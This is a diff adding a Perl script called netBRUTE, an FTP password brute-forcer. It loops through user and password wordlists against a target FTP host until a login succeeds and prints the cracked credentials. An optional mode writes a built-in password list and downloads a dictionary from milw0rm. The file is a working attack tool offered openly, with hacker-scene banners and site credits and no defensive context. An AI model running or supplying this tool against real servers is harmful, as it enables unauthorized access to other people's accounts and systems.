@@ -1,0 +1,145 @@
+#!/usr/local/bin/perl
+#######################################   
+#  
+# name: netBRUTE
+# coder: Perforin
+# status: public
+#
+#######################################   
+#
+# +++[+] SiTeS [+]+++
+# Dark-CodeZ.org      
+# perforins-script-labor.dl.am
+#
+#######################################   
+#
+# Usage: perl netbrute.pl URL USER/USERLIST PASSLIST
+#
+#######################################                                         
+
+use Net::FTP;
+use LWP::Simple;
+
+print q {
+            _   ____  _____  _    _ _______ ______ 
+           | | |  _ \|  __ \| |  | |__   __|  ____|
+ _ __   ___| |_| |_) | |__) | |  | |  | |  | |__   
+| '_ \ / _ \ __|  _ <|  _  /| |  | |  | |  |  __|  
+| | | |  __/ |_| |_) | | \ \| |__| |  | |  | |____ 
+|_| |_|\___|\__|____/|_|  \_\\\____/   |_|  |______|
+                                                   
+ };
+ 
+ my $version = 1.2;
+ my $usage = "USAGE: perl $0 URL USER/USERLIST PASSLIST\n";
+ if (@ARGV < 1) {
+ print " --> $usage";
+ exit;
+ }
+my $url = $ARGV[0];
+if ($ARGV[0] eq "-make") {
+print " --> Wordlist menue activated!\n";
+my @onboarddictionary = ("aaaa\n","bbbb\n","cccc\n","dddd\n","eeee\n","ffff\n","gggg\n",
+"hhhh\n","iiii\n","jjjj\n","kkkk\n","llll\n","mmmm\n","nnnn\n","oooo\n","pppp\n","qqqq\n",
+"rrrr\n","ssss\n","tttt\n","uuuu\n","vvvv\n","wwww\n","xxxx\n","yyyy\n","zzzz\n","0000\n",
+"1111\n","2222\n","3333\n","4444\n","5555\n","6666\n","7777\n","8888\n","9999\n","007\n",
+"hack\n","crack\n","lame\n","lol\n","w00t\n","haxhaxhax\n","fuck\n","administrator\n","fuckyou\n",
+"War\n","Bush\n","1337\n","HACKER\n","HAXOR\n","h4x0r\n","hiphop\n","metal\n","techno\n",
+"system\n","crash\n","overload\n","overtaken\n","nimda\n","admin\n","root\n","password\n",
+"pass\n","toor\n","secret\n","hunter\n","hagbard\n","fxp\n","gulli\n","pirat\n","pirate\n",
+"666\n","satan\n","knoten\n","Anna\n","Susi\n","lesbian\n","porno\n","porn\n","pr0n\n",
+"elite\n","abwehr\n","microsoft\n","sendmail\n","enter\n","ent0r\n","noob\n","n00b\n",
+"boon\n","b00n\n","napo\n","fickvater\n","mutter\n","italien\n","1990\n","1999\n","2000\n",
+"3000\n","4000\n","5000\n","1945\n","hitler\n","mussolini\n","roma\n","heinz\n","herbert\n",
+"atom\n","rofl\n","lawl\n","hund\n","katze\n","maus\n","anal\n","vaginal\n","oral\n","scheissegal\n",
+"raab\n","MTV\n","mtv\n","turbo\n","Herbst\n","Sommer\n","Winter\n","kack0rn\n","pups\n",
+"koks\n","kokain\n","heroin\n","joint\n","crystal\n","meth\n","johny\n","wayne\n","vergessen\n",
+"motor\n","manson\n","rock\n","punk\n","skater\n","skateordie\n","free4all\n","white\n","black\n",
+"emo\n","1992\n","1993\n","1994\n","1995\n","1996\n","1997\n","1998\n","1999\n",,"hatebreed\n","hellfire\n",
+"1991\n","1989\n","1988\n","1987\n","1986\n","1985\n","1984\n","1983\n","1982\n","1981\n","1980\n",
+"japan\n","china\n","typhon\n","bumsebiene\n","gras\n","frog\n","frosch\n","fly\n","fliege\n",
+"dsl\n","ram\n","cpu\n","gpu\n","gangsta\n","makaveli\n","butthole\n","buns\n","ass\n",,"warez\n","appz\n",
+"filez\n","leech\n","l33ch\n","lightning\n","beer\n","b33r\n","cartman\n","san\n","kyle\n","keny\n","mr.hat\n",
+"cola\n","coke\n","pet0r\n","sharen\n","peter\n","steven\n","manuel\n","joe\n","jeff\n",,"samantha\n","salome\n",
+"lilian\n","susan\n","cindy\n","sandra\n","finn\n","mats\n","madsen\n","cholera\n","conny\n","christine\n","philipe\n",
+"black\n","white\n","gamer\n","gam0r\n","spellborn\n","steveo\n","jackass\n","pontius\n","help\n","bluescreen\n","baseball\n",
+"foorball\n","pokemon\n","pikachu\n","microshit\n","linux\n","windows\n","karibik\n","england\n","omg\n","masterchief\n","nope\n");
+open(userlist,">users.txt");
+print userlist @onboarddictionary;
+close(userlist);
+my $content=getstore('http://www.milw0rm.com/mil-dic.php','mil-dic.txt') || die(" <-- Milw0rm down?!\n");
+rename ("mil-dic.txt", "wordlist.txt");
+exit;
+}
+if ($url =~ m/(http:)/) {
+print " <-- Post URL without http!\n";
+exit;
+}
+my $user = $ARGV[1];
+if ($user =~ m/(.txt|.lst)/) {
+print "--> Brute URL: "."$url"."\n";
+print " --> Brute with USERLIST: "."$user"."\n";
+print " --> Brute with PASSLIST: "."$pass_list"."\n";
+print " --> Start bruting now!\n";
+my @users = ();
+open (USER, "$user") || die " <-- Userlist not found!\n";
+ while (my $lines = <USER>)
+                    { (my $users) = split(" ",$lines);
+                      push (@users, "$users");
+                    };
+close(USER);
+my @passes = ();
+my $pass_list = $ARGV[2];
+open (PASS, "$pass_list") || die " <-- Passlist not found!\n";
+ while (my $lines = <PASS>)
+                    { (my $pass) = split(" ",$lines);
+                      push (@passes, "$pass");
+                    };
+close(PASS);
+foreach my $user (@users) {
+foreach my $pass (@passes) {
+$ftp = Net::FTP->new("$url",Debug => 0) or die " <-- Cannot conect to"."$url"."\n";
+if ($ftp->login("$user","$pass")) 
+{ print qq "
+ --> CRACKED!
+ --> USER: $user
+ --> PASSWORD: $pass
+";
+$ftp->quit;
+exit;
+}
+$ftp->quit;
+}}
+print " <-- User NOT found!\n";
+print " <-- Password NOT found!\n";
+print " <-- Bruting failed!\n";
+exit;
+}
+my @passes = ();
+my $pass_list = $ARGV[2];
+open (PASS, "$pass_list") || die " <-- Passlist not found!\n";
+ while (my $lines = <PASS>)
+                    { (my $pass) = split(" ",$lines);
+                      push (@passes, "$pass");
+                    };
+close(PASS);
+print "--> Brute URL: "."$url"."\n";
+print " --> Brute with USER: "."$user"."\n";
+print " --> Brute with PASSLIST: "."$pass_list"."\n";
+print " --> Start bruting now!\n";
+foreach my $pass (@passes) {
+$ftp = Net::FTP->new("$url",Debug => 0) or die " <-- Cannot conect to"."$url"."\n";
+if ($ftp->login("$user","$pass")) 
+{ print qq "
+ --> CRACKED!
+ --> USER: $user
+ --> PASSWORD: $pass
+";
+$ftp->quit;
+exit;
+}
+$ftp->quit;
+}
+print " <-- Password NOT found!\n";
+print " <-- Bruting failed!\n";
+exit;
